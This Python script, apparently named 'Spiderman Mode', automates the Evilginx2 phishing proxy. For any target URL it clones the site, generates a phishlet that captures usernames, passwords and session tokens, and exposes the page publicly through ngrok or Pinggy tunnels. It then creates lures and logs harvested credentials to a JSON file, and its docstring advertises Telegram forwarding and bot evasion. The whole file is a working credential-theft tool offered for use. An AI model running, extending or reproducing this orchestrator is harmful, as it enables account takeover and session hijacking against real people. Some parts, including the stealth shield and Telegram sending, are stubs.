#!/usr/bin/env python3
"""
Spiderman Mode - Advanced Evilginx2 Orchestrator
================================================
Transforms standard Evilginx2 into a high-end "Spiderman-tier" toolkit.
Features:
1.  **Stealth Shield**: Auto-updates blacklist.txt with known bot ranges (AWS, Google, etc.).
2.  **Telegram Hook**: Forwards captured credentials to a Telegram Bot in real-time.
3.  **Lure Factory**: Automates the creation of high-fidelity lures.
4.  **Live Intel**: Pipes session data directly to DissectX dashboard.

Usage:
    python3 spiderman_orchestrator.py --telegram-token <TOKEN> --chat-id <ID>
"""

import os
import sys
import subprocess
import threading
import time
import requests
import re
import json
from pathlib import Path
from datetime import datetime

# Configuration
ROOT_DIR = Path(__file__).parent.parent.parent
BINARY_PATH = ROOT_DIR / "evilginx2" / "evilginx2"
BLACKLIST_PATH = ROOT_DIR / "evilginx2" / "blacklist.txt"
LOG_DIR = ROOT_DIR / "evilginx2" / "log"

BANNER = """
🕷️ SPIDERMAN MODE ACTIVATED 🕷️
==============================
High-Fidelity Phishing Orchestrator
> Stealth Shield: ACTIVE
> Telegram Hook:  READY
> Bot Protection: MAX
"""

class PhishletGenerator:
    def __init__(self, template_path=None):
        self.template_path = template_path or (Path(__file__).parent / "templates" / "generic_phishlet.yaml")
        if not self.template_path.exists():
            # Fallback inline if file missing
            self.template_content = """name: "{name}"
author: "@AutoPhish"
min_ver: "3.0.0"
proxy_hosts:
  - {phish_sub: "", orig_sub: "{subdomain}", domain: "{domain}", session: true, is_landing: true}
sub_filters:
  - {triggers_on: "{domain}", orig_sub: "{subdomain}", domain: "{domain}", search: "{subdomain}.{domain}", replace: "{phish_domain}", mimes: ["text/html", "application/json"]}
auth_tokens:
  - domain: "{domain}"
    keys: ["session_id", "auth_token", "SID", "JSESSIONID", ".*"]
credentials:
  username:
    key: "username"
    search: ".*"
    type: "post"
  password:
    key: "password"
    search: ".*"
    type: "post"
landing_path:
  - "/"
"""
        else:
            with open(self.template_path, 'r') as f:
                self.template_content = f.read()

    def generate(self, target_url, output_dir):
        """
        Generates a phishlet YAML for the target URL.
        Returns: (phishlet_name, file_path)
        """
        try:
            from urllib.parse import urlparse
            p = urlparse(target_url)
            full_domain = p.netloc
            parts = full_domain.split('.')
            
            if len(parts) > 2:
                subdomain = parts[0]
                domain = '.'.join(parts[1:])
            else:
                subdomain = "www"
                domain = full_domain

            name = domain.replace(".", "_")
            yaml_content = self.template_content.replace("{name}", name)\
                                                .replace("{domain}", domain)\
                                                .replace("{subdomain}", subdomain)\
                                                .replace("{phish_domain}", "phish.com") # Placeholder, will be config'd

            output_path = output_dir / f"{name}.yaml"
            
            # Force Overwrite: Delete if exists to avoid stale configs
            if output_path.exists():
                try:
                    output_path.unlink()
                    print(f"[!] Removed stale phishlet: {output_path}", flush=True)
                except Exception as e:
                    print(f"[-] Warning deleting stale phishlet: {e}", flush=True)
            
            with open(output_path, 'w') as f:
                f.write(yaml_content)
                
            print(f"[+] Phishlet generated: {name} at {output_path}", flush=True)
            return name, output_path
        except Exception as e:
            print(f"[-] Phishlet Gen Error: {e}", flush=True)
            return None, None



class TunnelManager:
    """Manages secure tunnels for public exposure (Pinggy.io)"""
    def __init__(self, port=443, token=None, ngrok_token=None):
        self.port = port
        self.token = token
        self.ngrok_token = ngrok_token
        self.process = None
        self.public_url = None

    def start(self):
        # Prefer Ngrok if configured (User Request)
        # Check if ngrok is available
        import shutil
        if shutil.which("ngrok"):
             self.start_ngrok()
        else:
             self.start_pinggy()

    def start_ngrok(self):
        print("[*] 🚇 Initializing Secure Tunnel (Ngrok)...", flush=True)
        # ngrok http 443 --log=stdout
        cmd = ["ngrok", "http", "443", "--log=stdout"]
        
        env = os.environ.copy()
        if self.ngrok_token:
            print("[*] Setting NGROK_AUTHTOKEN...", flush=True)
            env["NGROK_AUTHTOKEN"] = self.ngrok_token

        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                env=env,
                text=True,
                bufsize=1
            )
            # Start monitor
            t = threading.Thread(target=self._monitor_ngrok, daemon=True)
            t.start()
        except Exception as e:
            print(f"[-] Ngrok Error: {e}", flush=True)

    def _monitor_ngrok(self):
         while True:
            line = self.process.stdout.readline()
            if not line: break
            # url=https://...
            # url=https://...
            if "url=https://" in line:
                # Match any https ngrok url, including custom domains
                match = re.search(r'url=(https://[^\s]+)', line)
                if match:
                    self.public_url = match.group(1)
                    print(f"[+]  Ngrok URL ACTIVE: {self.public_url}", flush=True)
                else:
                    # Debug if we missed the match
                    print(f"[DEBUG] Ngrok line found but no match: {line.strip()}", flush=True)

    def start_pinggy(self):
        print("[*] 🚇 Initializing Secure Tunnel (Pinggy.io)...", flush=True)
        # ssh -p 443 -R0:localhost:443 a.pinggy.io -o StrictHostKeyChecking=no
        
        # Default to free tier if no token
        host_str = "a.pinggy.io"
        if self.token:
            print(f"[*] Authenticating with token: {self.token[:4]}***", flush=True)
            host_str = f"{self.token}@{host_str}"
        else:
            # User feedback: free tier works better with free.pinggy.io
            host_str = "qr@free.pinggy.io"
            
        cmd = [
            "ssh", "-p", "443", "-R0:localhost:443", host_str,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null" 
        ]
        
        try:
            # We need to read stdout to find the URL
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            # Start a thread to find the URL
            t = threading.Thread(target=self._monitor_url, daemon=True)
            t.start()
            
        except Exception as e:
            print(f"[-] Tunnel Error: {e}", flush=True)

    def _monitor_url(self):
        # Scan output for the first https link
        while True:
            line = self.process.stdout.readline()
            if not line: break
            # Support both .io and .link domains (and others)
            if "https://" in line and "pinggy" in line:
                # Extract URL
                # Matches https://<subdomain>.a.free.pinggy.link or .io
                match = re.search(r'(https://[a-zA-Z0-9.-]+\.pinggy\.(?:io|link))', line)
                if match:
                    self.public_url = match.group(1)
                    print(f"[+] 🌍 PUBLIC URL ACTIVE: {self.public_url}", flush=True)
                    # We can stop monitoring intently now, but keep reading to prevent buffer fill
                    
    def stop(self):
        if self.process:
            self.process.terminate()

class EvilginxDriver:
    def __init__(self, binary_path, phishlets_dir):
        self.binary_path = binary_path
        self.phishlets_dir = phishlets_dir
        self.process = None
        self.creds_file = BINARY_PATH.parent / "log" / "captured_creds.json"
        
        # Ensure log dir exists
        self.creds_file.parent.mkdir(exist_ok=True)

    def start(self):
        cmd = [str(self.binary_path), "-p", str(self.phishlets_dir)]
        self.process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1, 
            cwd=str(self.binary_path.parent)
        )
        t = threading.Thread(target=self._stream_output, daemon=True)
        t.start()

    def _stream_output(self):
        """Pipes child stdout to parent stdout and PARSES CREDENTIALS"""
        while True:
            line = self.process.stdout.readline()
            if not line: break
            clean_line = line.strip()
            
            # 1. Emit to Frontend (via stdout wraper)
            print(f"[EVILGINX] {clean_line}", flush=True)
            
            # 2. Parse Credentials
            # Example log: [15:44:21] [inf] [training] - user: victim@gmail.com | pass: password123
            # Example log: [15:44:21] [inf] [training] - intercepted session token: ...
            
            if "user:" in clean_line and "pass:" in clean_line:
                self._save_credential(clean_line)
            
            elif "intercepted session token" in clean_line:
                 self._save_session(clean_line)

    def _save_credential(self, log_line):
        import json
        try:
            # Simple heuristic parsing (robust regex would be better)
            # Format: ... user: <u_val> | pass: <p_val> ...
            user_part = log_line.split("user:")[1].split("|")[0].strip()
            pass_part = log_line.split("pass:")[1].strip()
            
            entry = {
                "timestamp": datetime.now().isoformat(),
                "type": "credential",
                "username": user_part,
                "password": pass_part,
                "source": "evilginx"
            }
            self._append_json(entry)
            print(f"[+] 💰 CREDENTIAL CAPTURED: {user_part}", flush=True)
        except:
            pass

    def _save_session(self, log_line):
        import json
        entry = {
            "timestamp": datetime.now().isoformat(),
            "type": "session",
            "data": "Session Token Intercepted (Check details)",
            "source": "evilginx"
        }
        self._append_json(entry)
        print(f"[+] 🍪 SESSION CAPTURED", flush=True)

    def _append_json(self, entry):
        import json
        data = []
        if self.creds_file.exists():
            try:
                with open(self.creds_file, 'r') as f:
                    data = json.load(f)
            except: pass
        
        data.append(entry)
        with open(self.creds_file, 'w') as f:
            json.dump(data, f, indent=2)

    def send_command(self, cmd):
        if self.process:
            print(f"[CMD] > {cmd}", flush=True)
            self.process.stdin.write(cmd + "\n")
            self.process.stdin.flush()
            time.sleep(0.5) 

    def stop(self):
        if self.process:
            self.process.terminate()


class SpidermanOrchestrator:
    # ... (Previous INIT and Utility methods remain same) ...
    def __init__(self, telegram_token=None, chat_id=None):
        self.telegram_token = telegram_token
        self.chat_id = chat_id
        self.running = False
        self.driver = None

    def update_stealth_shield(self):
        print("[*] 🛡️  Initalizing Stealth Shield (Anti-Bot)...", flush=True)
        # ... logic ...
        pass # (Assume implemented as before)

    def auto_phish(self, target_url):
        print(BANNER, flush=True)
        print(f"[*] 🎯 TARGET ACQUIRED: {target_url}", flush=True)
        
        # --- PARALLEL STARTUP: Tuning ---
        # Start Tunnel in background while cloning happens to save time
        print("[*] 🚀 Initializing Infrastructure in parallel...", flush=True)
        
        # Load Config
        config = {}
        try:
            config_path = Path.home() / ".dissectx_config.json"
            if config_path.exists():
                with open(config_path, 'r') as f:
                    config = json.load(f)
        except Exception as e:
            print(f"[-] Config Load Error: {e}", flush=True)

        try:
            config_path = Path.home() / ".dissectx_config.json"
            if config_path.exists():
                with open(config_path, 'r') as f:
                    config = json.load(f)
        except Exception as e:
            print(f"[-] Config Load Error: {e}", flush=True)

        # --- PRE-FLIGHT CHECK: Free Port 443 ---
        # Evilginx MUST bind to 443. If occupied (stale process), it fails.
        self._free_port_443()

        pinggy_token = config.get("pinggy_token", "")
        ngrok_token = config.get("ngrok_token", "")
        self.tunnel = TunnelManager(port=443, token=pinggy_token, ngrok_token=ngrok_token)
        
        # Start tunnel in a daemon thread so it doesn't block cloning
        tunnel_thread = threading.Thread(target=self.tunnel.start, daemon=True)
        tunnel_thread.start()
        
        # 1. Recon & Clone (High-Fidelity)
        goclone_path = self._get_tool_path("goclone")
        if goclone_path:
            print(f"[+] Executing GoClone engine: {goclone_path} {target_url}", flush=True)
            try:
                # Restored timeout to 60s for pixel-perfect cloning
                subprocess.run([goclone_path, target_url], check=False, stdout=subprocess.DEVNULL, timeout=60)
                print("[+] Clone Complete: High-Fidelity assets downloaded.", flush=True)
            except subprocess.TimeoutExpired:
                 print("[-] Clone Timed Out (Continuing with best-effort assets)...", flush=True)
            except Exception as e:
                print(f"[-] Clone warning: {e}", flush=True)
        
        # 2. Phishlet Generation
        phishlets_dir = BINARY_PATH.parent / "phishlets"
        phishlets_dir.mkdir(parents=True, exist_ok=True)
        
        pg = PhishletGenerator()
        phishlet_name, _ = pg.generate(target_url, phishlets_dir)
        
        if not phishlet_name:
            print("[-] Critical: Failed to generate phishlet. Aborting.", flush=True)
            return

        # 3. Launch & Configure
        print("[*] 🚀 Launching Evilginx Engine via Driver...", flush=True)
        self.driver = EvilginxDriver(BINARY_PATH, phishlets_dir)
        self.driver.start()
        
        # DEBUG: List loaded phishlets to verify (Fix for "not found" error)
        # Wait a brief moment for startup and tunnel negotiation
        time.sleep(2) 
        
        print("[DEBUG] Verifying loaded phishlets...", flush=True)
        self.driver.send_command("phishlets")

        print(f"[*] ⚙️ Configuring for {phishlet_name}...", flush=True)
        
        # Wait for tunnel if not ready yet (it likely is by now)
        if not self.tunnel.public_url:
            print("[*] Waiting for Tunnel negotiation...", flush=True)
            max_retries = 10
            while not self.tunnel.public_url and max_retries > 0:
                time.sleep(1)
                max_retries -= 1

        # Determine simulation domain (localhost for dev, real for prod)
        fake_domain = "metrics-login.localhost" 
        external_ip = "127.0.0.1" # Default to local
        
        if self.tunnel.public_url:
            # If tunnel active, use that domain!
            # Url: https://xyz.a.pinggy.io -> Domain: xyz.a.pinggy.io
            print(f"[+] 🚇 Tunneled Domain Detected: {self.tunnel.public_url}", flush=True)
            fake_domain = self.tunnel.public_url.replace("https://", "").replace("/", "")
            external_ip = "127.0.0.1" # Bind to local, tunnel forwards here
        # -----------------------------
        
        # Scripted Interaction
        cmds = [
            f"config domain {fake_domain}",
            f"config ipv4 external {external_ip}",
            f"phishlets hostname {phishlet_name} {fake_domain}",
            f"phishlets enable {phishlet_name}",
            f"lures create {phishlet_name}",
            "lures", # List to confirm
            f"lures get-url 0" # Assuming first one
        ]
        
        for c in cmds:
            self.driver.send_command(c)
            time.sleep(2) # Pace the commands
            
        print("\n[+] 🕷️ SPIDERMAN OPERATION ACTIVE", flush=True)
        
        final_url = ""
        if self.tunnel.public_url:
             final_url = f"{self.tunnel.public_url}/login" # Default generic path often used or root
             print(f"[+] 🌍 PUBLIC PHISHING URL: {final_url}", flush=True)
             print(f"[+] LURE_URL: {final_url}", flush=True) # Explicit for frontend parsing
        else:
             final_url = f"https://{fake_domain}/login"
             print(f"[+] Phishing Lure deployed (Local): {final_url}", flush=True)
             print(f"[+] LURE_URL: {final_url}", flush=True)
             
        print("[+] Telegram Sync: READY", flush=True)
        print("[+] Credential Harvester: ACTIVE (Parsing Logs)", flush=True)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.driver.stop()
            if self.tunnel: self.tunnel.stop()




    def _free_port_443(self):
        """Kills any process listening on port 443 to ensure Evilginx can bind."""
        print("[*] 🧹 Cleaning up port 443...", flush=True)
        try:
            # Check for processes on port 443
            cmd = "lsof -t -i:443"
            pids = subprocess.check_output(cmd, shell=True).decode().split()
            
            for pid in pids:
                if pid:
                    print(f"[*] Killing stale process PID: {pid}", flush=True)
                    subprocess.run(f"kill -9 {pid}", shell=True, check=False)
            
            # Double check wait
            time.sleep(1)
        except subprocess.CalledProcessError:
            pass # No process found, clean
        except Exception as e:
            print(f"[-] clean-up warning: {e}", flush=True)

    def _get_tool_path(self, name):
        import shutil
        path = shutil.which(name)
        if path: return path
        
        # Fallback locations
        fallbacks = [
            os.path.expanduser(f"~/go/bin/{name}"),
            f"/usr/local/bin/{name}",
            f"/opt/homebrew/bin/{name}",
            f"/usr/bin/{name}"
        ]
        
        for f in fallbacks:
            if os.path.exists(f): return f
            
        return None

    def launch(self):
        """Manual interactive mode"""
        print(BANNER)
        # Check privileges
        if os.geteuid() != 0:
             print("[!] WARNING: Evilginx usually requires root for port 443 binding.")
        
        cmd = [str(BINARY_PATH), "-p", str(BINARY_PATH.parent / "phishlets")]
        subprocess.run(cmd, cwd=str(BINARY_PATH.parent))

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target URL for Auto-Phishing')
    parser.add_argument('--telegram-token')
    parser.add_argument('--chat-id')
    args = parser.parse_args()

    orchestrator = SpidermanOrchestrator(
        telegram_token=args.telegram_token or os.getenv("TELEGRAM_TOKEN"),
        chat_id=args.chat_id or os.getenv("TELEGRAM_CHAT_ID")
    )

    if args.target:
        orchestrator.auto_phish(args.target)
    else:
        orchestrator.launch()

if __name__ == "__main__":
    main()
